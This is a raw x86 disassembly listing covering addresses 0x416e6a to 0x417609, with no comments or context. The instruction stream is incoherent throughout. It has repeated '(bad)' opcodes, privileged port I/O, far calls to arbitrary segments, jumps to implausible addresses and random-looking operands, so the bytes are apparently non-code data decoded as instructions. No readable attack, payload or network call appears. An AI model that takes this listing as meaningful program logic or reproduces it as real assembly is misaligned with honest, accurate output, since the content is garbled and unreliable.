  416e6a:	inc    ebx
  416e6b:	cld    
  416e6c:	out    dx,eax
  416e6d:	mov    esi,0x1e736f
  416e72:	fcom   QWORD PTR [ecx]
  416e74:	sbb    al,0xc8
  416e76:	retf   0xa7a4
  416e79:	jbe    0x416e5c
  416e7b:	xor    al,BYTE PTR [esi+0x5c]
  416e7e:	and    eax,0x434b91fd
  416e83:	(bad)  
  416e84:	in     al,dx
  416e85:	aaa    
  416e86:	bound  esp,QWORD PTR [ecx-0x3f7cfbff]
  416e8c:	js     0x416ec3
  416e8e:	xor    al,0xfa
  416e90:	push   0xfffffffc
  416e92:	aaa    
  416e93:	outs   dx,DWORD PTR ds:[esi]
  416e94:	pop    edi
  416e95:	mov    esi,0xdc8ab356
  416e9a:	jne    0x416ebf
  416e9c:	inc    ebp
  416e9d:	xchg   esp,eax
  416e9e:	dec    ebp
  416e9f:	inc    ebp
  416ea0:	int    0x88
  416ea2:	or     DWORD PTR [edi-0x5d],esp
  416ea5:	or     ecx,DWORD PTR [edi-0x37]
  416ea8:	(bad)  
  416eaa:	shl    ebx,0xd1
  416ead:	imul   ebx,DWORD PTR [ebp+0x2fe0d213],0xf4739b86
  416eb7:	jns    0x416e8d
  416eb9:	jne    0x416e3c
  416ebb:	test   eax,0xbfc0ebdc
  416ec0:	or     DWORD PTR [eax],ebp
  416ec2:	push   edi
  416ec3:	push   esi
  416ec4:	ins    BYTE PTR es:[edi],dx
  416ec5:	add    al,0x94
  416ec7:	dec    esi
  416ec8:	cs jg  0x416e60
  416ecb:	stos   DWORD PTR es:[edi],eax
  416ecc:	inc    eax
  416ecd:	leave  
  416ece:	ret    0x397
  416ed1:	sbb    BYTE PTR [ebp+0x2e],bh
  416ed4:	add    DWORD PTR [edi],ebp
  416ed6:	adc    DWORD PTR [eax+0x76698de6],edi
  416edc:	cld    
  416edd:	inc    esp
  416ede:	retf   0xd53e
  416ee1:	lods   al,BYTE PTR ds:[esi]
  416ee2:	in     al,0x8b
  416ee4:	xchg   DWORD PTR [edi+0x41f46cef],ebx
  416eea:	cs mov ebp,0x37b942c1
  416ef0:	fimul  DWORD PTR [edi+0xcf195ad]
  416ef6:	out    0x60,al
  416ef8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ef9:	mov    cl,0x3c
  416efb:	mov    ds:0xf47d4a8,al
  416f00:	fmul   QWORD PTR [eax+0x7db5ca09]
  416f06:	aaa    
  416f07:	div    dh
  416f09:	adc    esp,DWORD PTR [edx-0x6]
  416f0c:	pop    ebx
  416f0d:	rol    esp,1
  416f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f10:	push   ss
  416f11:	pusha  
  416f12:	sub    eax,0xf5737d0b
  416f17:	inc    ebp
  416f18:	cmp    ch,dl
  416f1a:	test   DWORD PTR [edx+esi*2+0x1d4c4387],ebx
  416f21:	ins    DWORD PTR es:[edi],dx
  416f22:	jnp    0x416eb4
  416f24:	arpl   WORD PTR ds:0xe71d18ac,bp
  416f2a:	(bad)  
  416f2b:	enter  0x98b2,0xd0
  416f2f:	mov    ds:0x5fc5cf57,al
  416f34:	pushf  
  416f35:	ins    BYTE PTR es:[edi],dx
  416f36:	stos   DWORD PTR es:[edi],eax
  416f37:	push   edx
  416f38:	shl    BYTE PTR [ecx-0x69984e95],1
  416f3e:	sbb    DWORD PTR [ebx-0xe5f4663],eax
  416f44:	mov    eax,ds:0xf4a72d29
  416f49:	test   DWORD PTR [ebp-0x29],edi
  416f4c:	pop    eax
  416f4d:	pop    edi
  416f4e:	ror    DWORD PTR [ebp-0x374706bb],1
  416f54:	repz xor DWORD PTR [ecx-0x40],eax
  416f58:	adc    DWORD PTR [ebx],esi
  416f5a:	dec    esi
  416f5b:	pop    ebx
  416f5c:	push   ds
  416f5d:	jo     0x416f7d
  416f5f:	aaa    
  416f60:	inc    ecx
  416f61:	jl     0x416fdc
  416f63:	ds retf 0xf881
  416f67:	mov    eax,0x29eff3b2
  416f6c:	rcr    BYTE PTR [eax-0x1725904f],0xae
  416f73:	nop
  416f74:	xor    ch,ah
  416f76:	sbb    bh,BYTE PTR [edx+0x24ddcf3a]
  416f7c:	bound  ebp,QWORD PTR [edi+0x1a4a8ab3]
  416f82:	sar    DWORD PTR [edi],cl
  416f84:	inc    ebp
  416f85:	adc    ecx,DWORD PTR [esi+edx*8-0x3b1341ad]
  416f8c:	in     al,0x5a
  416f8e:	xor    DWORD PTR [edi+0x58c5000c],esi
  416f94:	sub    DWORD PTR [esi+0x66],edi
  416f97:	xchg   esi,eax
  416f98:	dec    eax
  416f99:	popa   
  416f9a:	hlt    
  416f9b:	in     eax,dx
  416f9c:	aam    0xfc
  416f9e:	jp     0x416f5e
  416fa0:	add    eax,0xc4d06898
  416fa5:	sahf   
  416fa6:	rcl    DWORD PTR [edi],cl
  416fa8:	add    bl,ah
  416faa:	mov    ah,0xcb
  416fac:	clc    
  416fad:	aaa    
  416fae:	rcr    DWORD PTR [esi-0x3af3c9b4],cl
  416fb4:	sub    BYTE PTR [bx+si],ah
  416fb7:	dec    edi
  416fb8:	add    BYTE PTR gs:[eax],0x9
  416fbc:	iret   
  416fbd:	idiv   esi
  416fbf:	push   ebx
  416fc0:	push   edx
  416fc1:	loope  0x416f4a
  416fc3:	jo     0x416fb2
  416fc5:	mov    eax,esp
  416fc7:	out    dx,al
  416fc8:	ss xchg edx,eax
  416fca:	pop    esi
  416fcb:	and    eax,DWORD PTR [ecx+0x6c7010c3]
  416fd1:	test   al,0xa5
  416fd3:	xor    DWORD PTR [esi+0x6bd9a66d],esp
  416fd9:	int    0x96
  416fdb:	mov    ch,BYTE PTR [eax-0x65]
  416fde:	mov    cl,0x96
  416fe0:	lods   al,BYTE PTR ds:[esi]
  416fe1:	and    DWORD PTR [edi],ecx
  416fe3:	in     eax,dx
  416fe4:	sbb    dl,al
  416fe6:	in     eax,dx
  416fe7:	enter  0x59ac,0xc9
  416feb:	mov    WORD PTR [edx+0x37574c11],?
  416ff1:	ficom  WORD PTR [eax]
  416ff3:	repnz lea eax,[esi+esi*8]
  416ff7:	pushf  
  416ff8:	jp     0x416fde
  416ffa:	call   0xd756:0xa1330122
  417001:	bound  edx,QWORD PTR [ecx]
  417003:	jne    0x416f9a
  417005:	leave  
  417006:	retf   
  417007:	mov    dh,0xdd
  417009:	xor    edi,DWORD PTR [esi+0x5ef5be96]
  41700f:	pushf  
  417010:	dec    ecx
  417011:	dec    ebp
  417012:	pop    ebp
  417013:	out    0x10,eax
  417015:	jns    0x416fd7
  417017:	pop    ebp
  417018:	popf   
  417019:	lock or al,0xf2
  41701c:	push   0xffffffde
  41701e:	push   cs
  41701f:	nop
  417020:	xlat   BYTE PTR ds:[ebx]
  417021:	add    BYTE PTR [eax],cl
  417023:	ja     0x417019
  417025:	lea    eax,[esi+0x26]
  417028:	mov    ebp,0x6496b93f
  41702d:	ins    BYTE PTR es:[edi],dx
  41702e:	sub    edi,DWORD PTR ds:0x3447a212
  417034:	mov    eax,ds:0xe231b328
  417039:	mov    al,0xe1
  41703b:	not    DWORD PTR [edx]
  41703d:	or     DWORD PTR [esi],0xffffffc0
  417040:	(bad)  
  417041:	xor    ebx,DWORD PTR [edi+0x58275fef]
  417047:	cmp    dl,al
  417049:	inc    ebx
  41704a:	xchg   ecx,eax
  41704b:	mov    edx,0x9192c6e9
  417050:	xor    DWORD PTR [esi+0x6a3e44e3],edx
  417056:	daa    
  417057:	ja     0x41702c
  417059:	(bad)  [ecx]
  41705b:	mov    esp,DWORD PTR [edx]
  41705d:	cwde   
  41705e:	or     cl,BYTE PTR [ecx-0x59432a6c]
  417064:	xor    al,0x26
  417066:	aad    0x9c
  417068:	adc    esp,ebx
  41706a:	xchg   edx,eax
  41706b:	jns    0x417095
  41706d:	inc    edi
  41706e:	and    dh,BYTE PTR ds:0x7fbc698b
  417074:	push   0xdf8c66fa
  417079:	add    DWORD PTR [edx],ebp
  41707b:	dec    esi
  41707c:	out    0x32,al
  41707e:	sbb    BYTE PTR [edx],cl
  417080:	sti    
  417081:	fadd   QWORD PTR [ecx]
  417083:	mov    ecx,0x9644c1dc
  417088:	or     edi,DWORD PTR ds:[ecx+0x1d]
  41708c:	or     ah,ch
  41708e:	ret    
  41708f:	pushf  
  417090:	mov    bl,0x62
  417092:	sub    DWORD PTR [edi-0x70],edx
  417095:	pop    es
  417096:	jmp    0x4170b1
  417098:	fldenv [eax+ebx*1-0x39311a57]
  41709f:	cwde   
  4170a0:	loopne 0x417111
  4170a2:	ror    BYTE PTR [edi+0x51b7d6ed],cl
  4170a8:	outs   dx,BYTE PTR ds:[esi]
  4170a9:	stos   DWORD PTR es:[edi],eax
  4170aa:	cmp    ch,BYTE PTR [edx+0x6a]
  4170ad:	and    DWORD PTR [eax-0x63],edi
  4170b0:	dec    edx
  4170b1:	dec    esi
  4170b2:	xlat   BYTE PTR ds:[ebx]
  4170b3:	ret    0x5268
  4170b6:	sbb    BYTE PTR [edx+0x6c],cl
  4170b9:	push   cs
  4170ba:	mov    eax,esp
  4170bc:	mov    ds:0x858651cb,al
  4170c1:	sub    dl,BYTE PTR [eax]
  4170c3:	ret    0x96f2
  4170c6:	adc    BYTE PTR [edx+0x25],cl
  4170c9:	retf   
  4170ca:	sub    DWORD PTR [edx+edi*4-0x51],ebp
  4170ce:	(bad)  
  4170cf:	adc    ebp,DWORD PTR ss:[eax-0x16399796]
  4170d6:	or     eax,0x88a8752a
  4170db:	xchg   bh,dh
  4170dd:	test   BYTE PTR [edx+eax*2+0x1a53d90c],bh
  4170e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170e5:	aaa    
  4170e6:	pushf  
  4170e7:	fs iret 
  4170e9:	dec    esi
  4170ea:	pop    ebp
  4170eb:	(bad)  
  4170ec:	test   DWORD PTR [esi+0x22a28a1c],0x776b6a96
  4170f6:	mov    ah,0xa7
  4170f8:	jp     0x41715b
  4170fa:	int3   
  4170fb:	dec    edi
  4170fc:	pushf  
  4170fd:	bound  edx,QWORD PTR [ecx+0x33edd21b]
  417103:	dec    edx
  417104:	stc    
  417105:	out    0x58,eax
  417107:	stc    
  417108:	jmp    0xb33f4d96
  41710d:	push   es
  41710e:	outs   dx,DWORD PTR ds:[esi]
  41710f:	dec    ecx
  417110:	std    
  417111:	fstp   QWORD PTR [edi]
  417113:	push   esi
  417114:	in     eax,0xe1
  417116:	aaa    
  417117:	and    BYTE PTR [ebx],dl
  417119:	or     edi,DWORD PTR [edi]
  41711b:	rep ins DWORD PTR es:[edi],dx
  41711d:	mov    esi,0x7265757a
  417122:	xor    DWORD PTR [edi+0x50ccaba5],0xb9b83eae
  41712c:	clc    
  41712d:	out    dx,eax
  41712e:	cmp    cl,dl
  417130:	nop
  417131:	mov    ds:0x257c84d1,al
  417136:	jmp    ecx
  417138:	(bad)  
  417139:	pop    esi
  41713a:	add    DWORD PTR [esi],0xfffffff2
  41713d:	in     al,dx
  41713e:	jbe    0x417197
  417140:	cmc    
  417141:	pop    ebx
  417142:	jae    0x417190
  417144:	xchg   cl,bl
  417146:	mov    eax,0xe742ef42
  41714b:	out    0x83,al
  41714d:	jo     0x4171a3
  41714f:	call   0xdec:0x8923b13f
  417156:	adc    ah,ch
  417158:	cwde   
  417159:	and    eax,0x1f982b83
  41715e:	sbb    ebp,edx
  417160:	fcmovbe st,st(5)
  417162:	data16 outs dx,BYTE PTR ds:[esi]
  417164:	push   esp
  417165:	pop    ebx
  417166:	mov    BYTE PTR [eax-0x27ca3f1],cl
  41716c:	pop    edi
  41716d:	ins    BYTE PTR es:[edi],dx
  41716e:	ret    0xfa01
  417171:	lods   al,BYTE PTR ds:[esi]
  417172:	lds    eax,FWORD PTR [ebx-0x30]
  417175:	pop    esi
  417176:	mov    bh,0xd4
  417178:	jnp    0x4171cd
  41717a:	pop    edx
  41717b:	dec    eax
  41717c:	daa    
  41717d:	mov    DWORD PTR [esi+0x799495d7],ecx
  417183:	stc    
  417184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417185:	jmp    0x4171b1
  417187:	scas   eax,DWORD PTR es:[edi]
  417188:	sti    
  417189:	dec    ebx
  41718a:	or     eax,0x39e27526
  41718f:	and    eax,0xeedc551e
  417194:	push   es
  417195:	mov    ecx,0xa2106415
  41719a:	pop    edi
  41719b:	scas   eax,DWORD PTR es:[edi]
  41719c:	enter  0x6f34,0x6
  4171a0:	loop   0x417137
  4171a2:	xor    ah,BYTE PTR [ebx+edx*4+0x77a455d3]
  4171a9:	loopne 0x4171ea
  4171ab:	or     ebp,DWORD PTR [esi-0xf]
  4171ae:	jo     0x41722e
  4171b0:	xchg   edx,eax
  4171b1:	in     eax,0xb4
  4171b3:	mov    cl,0x32
  4171b5:	xchg   esi,eax
  4171b6:	jg     0x417164
  4171b8:	xchg   ebp,eax
  4171b9:	adc    dl,al
  4171bb:	jbe    0x41719f
  4171bd:	mov    edx,0x21ede666
  4171c2:	out    0x7d,eax
  4171c4:	aam    0x36
  4171c6:	jg     0x4171eb
  4171c8:	push   ebx
  4171c9:	jg     0x41718c
  4171cb:	cwde   
  4171cc:	loopne 0x4171ba
  4171ce:	pop    esp
  4171cf:	cld    
  4171d0:	pop    esp
  4171d1:	mov    bh,0x86
  4171d3:	pop    esi
  4171d4:	xchg   edx,eax
  4171d5:	inc    ebp
  4171d6:	xchg   edi,eax
  4171d7:	pop    ebx
  4171d8:	xor    BYTE PTR [esi+0xf],cl
  4171db:	push   es
  4171dc:	sbb    BYTE PTR [ebp+0x217970af],0x16
  4171e3:	inc    esp
  4171e4:	or     DWORD PTR [edx],edi
  4171e6:	outs   dx,DWORD PTR ds:[esi]
  4171e7:	fst    DWORD PTR [eax]
  4171e9:	jne    0x41725b
  4171eb:	and    ebp,esi
  4171ed:	cmp    DWORD PTR [edx],ebx
  4171ef:	fisubr DWORD PTR [eax-0x22]
  4171f2:	xchg   BYTE PTR [ebp-0x7a],dl
  4171f5:	outs   dx,BYTE PTR ds:[esi]
  4171f6:	dec    esi
  4171f7:	test   ebp,ebx
  4171f9:	mov    ebp,0xb2a1eeea
  4171fe:	pushf  
  4171ff:	adc    al,0xa2
  417201:	inc    eax
  417202:	pushf  
  417203:	sbb    BYTE PTR [edx+0x53],ah
  417206:	pop    edx
  417207:	int3   
  417208:	sbb    bh,BYTE PTR [ecx+0x242fb7dc]
  41720e:	fidiv  DWORD PTR [ebp+ebx*2-0x7d]
  417212:	pop    edi
  417213:	or     BYTE PTR [edi+ebx*4],0xe6
  417217:	xchg   BYTE PTR [eax+0x49],al
  41721a:	mov    dh,0xf5
  41721c:	sbb    ebx,ebx
  41721e:	push   ebp
  41721f:	and    al,0xd
  417221:	(bad)  
  417222:	xchg   ecx,eax
  417223:	jecxz  0x417206
  417225:	mov    edi,0x7ce79765
  41722a:	inc    eax
  41722b:	mov    ebx,0x82e54b2a
  417230:	enter  0xd99a,0xc2
  417234:	scas   al,BYTE PTR es:[edi]
  417235:	xor    ebx,DWORD PTR [edi+0x13]
  417238:	push   0x15
  41723a:	nop
  41723b:	or     edi,esp
  41723d:	cmc    
  41723e:	sbb    bl,BYTE PTR [ecx]
  417240:	cli    
  417241:	imul   BYTE PTR [ecx+0x21]
  417244:	or     al,0xc6
  417246:	and    eax,0x636a9dd4
  41724b:	fs out 0x51,eax
  41724e:	not    bl
  417250:	inc    eax
  417251:	and    BYTE PTR [ebx+0x6b5baf7a],bh
  417257:	pop    esp
  417258:	dec    edi
  417259:	cld    
  41725a:	push   es
  41725b:	adc    DWORD PTR [edi+eiz*4],esi
  41725e:	mov    ds:0x9f57b064,eax
  417263:	mov    dh,0x35
  417265:	mov    ds:0x4712bd77,eax
  41726a:	cmp    DWORD PTR [ebx+0x5e],esi
  41726d:	push   esp
  41726e:	or     bh,BYTE PTR [edx+esi*8]
  417271:	adc    BYTE PTR [esi],ch
  417273:	mul    DWORD PTR [esi+0x54e39545]
  417279:	or     cl,al
  41727b:	jnp    0x41724d
  41727d:	call   esi
  41727f:	adc    DWORD PTR [ebx+0x57],esi
  417282:	jb     0x417262
  417284:	pop    es
  417285:	mov    edi,0xb7c356b4
  41728a:	add    DWORD PTR [edi+0x76ace062],edi
  417290:	jmp    0xb9e911f7
  417295:	fnstcw WORD PTR [edx-0x27903f5a]
  41729b:	fnstcw WORD PTR [edx-0x67]
  41729e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41729f:	add    ecx,ecx
  4172a1:	stc    
  4172a2:	push   ecx
  4172a3:	popa   
  4172a4:	nop
  4172a5:	add    eax,0x546c86df
  4172aa:	pusha  
  4172ab:	mov    esp,0xb93ecd93
  4172b0:	jno    0x41731b
  4172b2:	add    BYTE PTR [ecx],0xdf
  4172b5:	dec    edi
  4172b6:	pop    edx
  4172b7:	sbb    cl,ah
  4172b9:	sub    ebp,DWORD PTR [esi-0x70]
  4172bc:	js     0x4172b9
  4172be:	rcr    BYTE PTR [ebx-0x40],1
  4172c1:	daa    
  4172c2:	or     DWORD PTR ds:0x97feef74,edi
  4172c8:	into   
  4172c9:	pop    edx
  4172ca:	push   ss
  4172cb:	cmp    edx,ecx
  4172cd:	out    dx,al
  4172ce:	cdq    
  4172cf:	cdq    
  4172d0:	retf   
  4172d1:	lahf   
  4172d2:	push   ss
  4172d3:	or     DWORD PTR [edx-0x18],eax
  4172d6:	sar    BYTE PTR [eax+0x5a],1
  4172d9:	sub    dh,dh
  4172db:	ret    0x4819
  4172de:	(bad)  
  4172df:	shl    esi,1
  4172e1:	jge    0x417358
  4172e3:	call   0xe9c1147f
  4172e8:	and    edi,DWORD PTR [esi+0x53c95794]
  4172ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172ef:	iret   
  4172f0:	js     0x417293
  4172f2:	(bad)  
  4172f3:	jl     0x4172a4
  4172f5:	or     BYTE PTR [ebp-0x6f],bl
  4172f8:	scas   al,BYTE PTR es:[edi]
  4172f9:	mov    ch,BYTE PTR [edx-0x6724436e]
  4172ff:	adc    DWORD PTR [edi+eax*4],ebx
  417302:	lods   eax,DWORD PTR ds:[esi]
  417303:	dec    esi
  417304:	and    cl,BYTE PTR [ebx-0xb]
  417307:	int3   
  417308:	mov    ebp,ecx
  41730a:	xchg   esi,eax
  41730b:	repnz addr16 push ebx
  41730e:	add    esi,edx
  417310:	push   esi
  417311:	pop    ecx
  417312:	add    DWORD PTR [ecx+ebp*4],eax
  417315:	sbb    cl,BYTE PTR [ecx-0x19]
  417318:	inc    ebx
  417319:	hlt    
  41731a:	pop    DWORD PTR [edx-0x61a0713c]
  417320:	ins    DWORD PTR es:[edi],dx
  417321:	inc    ecx
  417322:	sti    
  417323:	and    al,0x72
  417325:	out    dx,eax
  417326:	sbb    bh,BYTE PTR [ebx+0x5e]
  417329:	out    dx,eax
  41732a:	add    bh,cl
  41732c:	scas   al,BYTE PTR es:[edi]
  41732d:	push   edi
  41732e:	xor    ch,ch
  417330:	loopne 0x4172fd
  417332:	or     ebp,DWORD PTR [ebx-0x24]
  417335:	add    al,0x71
  417337:	jns    0x4172ca
  417339:	out    dx,eax
  41733a:	ret    
  41733b:	jle    0x4172df
  41733d:	push   edi
  41733e:	test   DWORD PTR [eax],esi
  417340:	xchg   esi,eax
  417341:	cmp    cl,ch
  417343:	sbb    ebp,DWORD PTR [edi-0xc]
  417346:	or     al,al
  417348:	hlt    
  417349:	les    ebx,FWORD PTR [eax-0x31]
  41734c:	inc    esi
  41734d:	scas   al,BYTE PTR es:[edi]
  41734e:	jmp    0xf041eddd
  417353:	enter  0x3bf2,0xad
  417357:	clc    
  417358:	inc    esi
  417359:	jp     0x117fcbe
  41735f:	arpl   WORD PTR [esi-0x7da8d72f],di
  417365:	and    ecx,DWORD PTR [edi+0x1d56c8d]
  41736b:	push   ds
  41736c:	inc    ebx
  41736d:	repnz es xchg ebp,eax
  417370:	neg    BYTE PTR [edi+ecx*2-0x6c7603dd]
  417377:	mov    ch,BYTE PTR [esi+0x370e2229]
  41737d:	jecxz  0x4173e3
  41737f:	call   DWORD PTR ds:0xf0ae818e
  417385:	or     eax,0x58d0bdc1
  41738a:	mov    WORD PTR [bp+si+0x723a],es
  41738f:	jmp    0x417339
  417391:	(bad)  
  417392:	imul   eax,DWORD PTR [edi],0x75445c95
  417398:	jns    0x417369
  41739a:	sub    esi,DWORD PTR cs:[esi-0x7915a2da]
  4173a1:	xor    al,0xc3
  4173a3:	enter  0x3632,0x6e
  4173a7:	add    al,0xe4
  4173a9:	rcr    BYTE PTR [edi-0x66],0x62
  4173ad:	sar    DWORD PTR [edi+0x30],0xd3
  4173b1:	inc    esi
  4173b2:	not    BYTE PTR [eax-0x782d81c6]
  4173b8:	fcomp  DWORD PTR [esi+0x20501859]
  4173be:	and    BYTE PTR [ecx],bl
  4173c0:	mov    ebp,0x19562d97
  4173c5:	mov    ecx,0x91d9a545
  4173ca:	es inc ebx
  4173cc:	call   0xc530:0xc9eb
  4173d2:	out    dx,al
  4173d3:	push   ecx
  4173d4:	or     al,0x3f
  4173d6:	ficom  DWORD PTR [edx-0x43f8ebcb]
  4173dc:	dec    ecx
  4173dd:	outs   dx,BYTE PTR ds:[esi]
  4173de:	adc    edi,DWORD PTR [esi+0x6d]
  4173e1:	lock (bad) 
  4173e4:	and    eax,0xa22827b5
  4173e9:	fisttp DWORD PTR [eax]
  4173eb:	aad    0x9b
  4173ed:	add    BYTE PTR [esp+edi*1-0x40],bl
  4173f1:	pop    ebp
  4173f2:	pop    ebp
  4173f3:	inc    esp
  4173f4:	pushf  
  4173f5:	int    0xdc
  4173f7:	mov    WORD PTR [edi+0x5a],gs
  4173fa:	cmp    DWORD PTR [ebx-0x51],ecx
  4173fd:	in     eax,0xd7
  4173ff:	adc    dl,BYTE PTR [ebx+0x51]
  417402:	inc    ecx
  417403:	adc    eax,0x58e1cf40
  417408:	mov    bh,0xa3
  41740a:	xchg   edi,eax
  41740b:	lods   eax,DWORD PTR ds:[esi]
  41740c:	iret   
  41740d:	lahf   
  41740e:	inc    eax
  41740f:	jmp    0xca14633b
  417414:	sub    al,0x97
  417416:	mov    esp,0xd51b79d8
  41741b:	mov    eax,DWORD PTR [edi+0x60]
  41741e:	adc    DWORD PTR [eax+0x2fd14092],esi
  417424:	scas   eax,DWORD PTR es:[edi]
  417425:	pop    eax
  417426:	gs dec edi
  417428:	sbb    esi,DWORD PTR [ebx-0x2435b9bc]
  41742e:	xchg   ebp,eax
  41742f:	int    0x5f
  417431:	loopne 0x4173d1
  417433:	or     al,0xc2
  417435:	mov    esi,0x403fe7b
  41743a:	sbb    DWORD PTR [ebx],ecx
  41743c:	dec    esp
  41743d:	int    0xf7
  41743f:	adc    esi,eax
  417441:	arpl   dx,si
  417443:	mov    ch,dl
  417445:	jp     0x4173f9
  417447:	dec    ebx
  417448:	jns    0x41748e
  41744a:	pop    eax
  41744b:	cli    
  41744c:	pusha  
  41744d:	add    esp,esi
  41744f:	sahf   
  417450:	and    DWORD PTR [eax],esp
  417452:	push   0xad532a00
  417457:	or     al,0x7d
  417459:	jbe    0x4174d1
  41745b:	int3   
  41745c:	ja     0x41748e
  41745e:	add    al,BYTE PTR [ebp+0x1d]
  417461:	inc    edi
  417462:	cld    
  417463:	test   dh,0x4e
  417466:	push   esp
  417467:	mov    dh,0xc3
  417469:	inc    ecx
  41746a:	mov    esi,0x141abe64
  41746f:	mov    cl,0x8b
  417471:	push   es
  417472:	rcl    BYTE PTR [eax-0x69],cl
  417475:	adc    al,0xa
  417477:	std    
  417478:	outs   dx,DWORD PTR ds:[esi]
  417479:	xor    DWORD PTR [eax],eax
  41747b:	pushf  
  41747c:	iret   
  41747d:	push   ecx
  41747e:	or     BYTE PTR [edx-0x48],al
  417481:	lods   al,BYTE PTR ds:[esi]
  417482:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417483:	mov    bh,0xb7
  417485:	js     0x41744d
  417487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417488:	fiadd  WORD PTR [ecx+0x46052ba5]
  41748e:	retf   0x6e35
  417491:	add    DWORD PTR [esi-0x4471058b],0xd9d5b9e7
  41749b:	add    al,BYTE PTR [edi+0x9ff1e52]
  4174a1:	push   ds
  4174a2:	xor    ecx,DWORD PTR [ebx-0x3f]
  4174a5:	and    ah,al
  4174a7:	dec    esi
  4174a8:	push   ecx
  4174a9:	jp     0x41745d
  4174ab:	pop    edx
  4174ac:	jae    0x4174ba
  4174ae:	(bad)  [ecx-0x3760ad78]
  4174b4:	fnstenv [ebx-0x25]
  4174b7:	dec    edx
  4174b8:	mov    ds:0x4a21d49b,eax
  4174bd:	push   edi
  4174be:	daa    
  4174bf:	ja     0x4174bf
  4174c1:	xchg   edi,eax
  4174c2:	addr16 push esi
  4174c4:	ss push eax
  4174c6:	aas    
  4174c7:	je     0x4174a5
  4174c9:	test   ch,bl
  4174cb:	xchg   esi,eax
  4174cc:	xchg   ecx,eax
  4174cd:	call   0x413074f9
  4174d2:	push   esp
  4174d3:	cld    
  4174d4:	gs xor eax,0xc5d157eb
  4174da:	shl    BYTE PTR [eax-0x12],cl
  4174dd:	ja     0x4174c9
  4174df:	and    BYTE PTR [esp+ebx*1+0x44],0xce
  4174e4:	inc    ebp
  4174e5:	pop    ebx
  4174e6:	pusha  
  4174e7:	out    dx,al
  4174e8:	fs sbb ecx,edx
  4174eb:	xor    edx,DWORD PTR [edx-0x118e787e]
  4174f1:	rcr    dh,1
  4174f3:	retf   
  4174f4:	cmp    ah,bh
  4174f6:	pop    ss
  4174f7:	xor    ch,dl
  4174f9:	int    0xc9
  4174fb:	xchg   ecx,eax
  4174fc:	shr    BYTE PTR [eax+0x51],0x99
  417500:	icebp  
  417501:	scas   eax,DWORD PTR es:[edi]
  417502:	jb     0x4174e1
  417504:	sbb    ah,ah
  417506:	int    0x78
  417508:	push   cs
  417509:	xchg   ecx,eax
  41750a:	call   0xb29f:0xb060f8a4
  417511:	mov    BYTE PTR [eax+0x718f034d],dl
  417517:	int    0xa9
  417519:	mov    WORD PTR [eax+ecx*1+0x30475e34],?
  417520:	push   ebp
  417521:	or     al,BYTE PTR [edx+0x2c]
  417524:	(bad)  [esi+0x5cc87d74]
  41752a:	popf   
  41752b:	lods   eax,DWORD PTR ss:[esi]
  41752d:	sub    al,0x5
  41752f:	and    eax,DWORD PTR [ebx]
  417531:	pop    edx
  417532:	ja     0x417542
  417534:	std    
  417535:	and    DWORD PTR [edx],ebx
  417537:	sub    dh,BYTE PTR [ecx]
  417539:	xchg   esi,eax
  41753a:	inc    esp
  41753b:	adc    BYTE PTR [ebp-0x4],0x5b
  41753f:	xchg   DWORD PTR [edi-0x5d],ecx
  417542:	and    edi,eax
  417544:	cmp    ecx,esi
  417546:	es pop edi
  417548:	xchg   ebx,ebp
  41754a:	pushf  
  41754b:	shr    cl,1
  41754d:	adc    eax,0x8cfaef44
  417552:	and    DWORD PTR [ecx-0x41],edi
  417555:	popf   
  417556:	scas   eax,DWORD PTR es:[edi]
  417557:	cdq    
  417558:	inc    eax
  417559:	lahf   
  41755a:	div    BYTE PTR [esp+ebx*2]
  41755d:	arpl   WORD PTR ds:0xcf62e519,cx
  417563:	xlat   BYTE PTR ds:[ebx]
  417564:	shl    BYTE PTR [eax+0x7],0x98
  417568:	loop   0x417565
  41756a:	or     al,0x3f
  41756c:	xor    eax,0x751c86cd
  417571:	dec    edx
  417572:	push   ecx
  417573:	and    BYTE PTR [ecx+esi*4+0x34],bl
  417577:	pop    edx
  417578:	ins    DWORD PTR es:[edi],dx
  417579:	fmulp  st(6),st
  41757b:	push   eax
  41757c:	push   ebp
  41757d:	enter  0xe93e,0x4f
  417581:	mov    eax,0xe71fcf11
  417586:	or     BYTE PTR [ebp+0x3fbbc2e4],0x9a
  41758d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41758e:	mov    ebp,0x34e954db
  417593:	jne    0x417583
  417595:	jecxz  0x417519
  417597:	and    al,0x84
  417599:	test   eax,0x625f2f4c
  41759e:	sub    eax,0x6f45f660
  4175a3:	jmp    0x73dd78dc
  4175a8:	push   eax
  4175a9:	ss retf 
  4175ab:	shl    DWORD PTR [ebx+0x52],0xc9
  4175af:	and    al,0x54
  4175b1:	js     0x417594
  4175b3:	icebp  
  4175b4:	hlt    
  4175b5:	loop   0x4175e2
  4175b7:	push   ss
  4175b8:	inc    ebx
  4175b9:	cmp    eax,DWORD PTR [ebp-0x4f]
  4175bc:	pop    ds
  4175bd:	inc    edi
  4175be:	dec    esp
  4175bf:	sbb    eax,0x49f493ab
  4175c4:	add    cl,BYTE PTR [edi+0x25]
  4175c7:	pop    ds
  4175c8:	pop    DWORD PTR [edx+ecx*8+0x58213cca]
  4175cf:	ret    0x5f44
  4175d2:	ret    
  4175d3:	xor    esp,ebx
  4175d5:	xchg   ebx,eax
  4175d6:	loopne 0x417585
  4175d8:	repz aaa 
  4175da:	jg     0x417609
  4175dc:	ficom  WORD PTR [ebx]
  4175de:	xchg   esp,eax
  4175df:	or     al,0x4
  4175e1:	pop    ss
  4175e2:	sti    
  4175e3:	stc    
  4175e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175e5:	imul   edi,DWORD PTR [ebp+0x1f59fc89],0x2dd28a8a
  4175ef:	aas    
  4175f0:	or     al,0xe3
  4175f2:	xor    eax,DWORD PTR [edi+0x43f36195]
  4175f8:	jl     0x417634
  4175fa:	fistp  DWORD PTR [edi+0x1e]
  4175fd:	loopne 0x4175a1
  4175ff:	std    
  417600:	mov    dh,0x22
  417602:	and    DWORD PTR [eax],ecx
  417604:	inc    esi
  417605:	xor    edi,DWORD PTR [ebp-0x80]
  417608:	push   ds
  417609:	push   cs
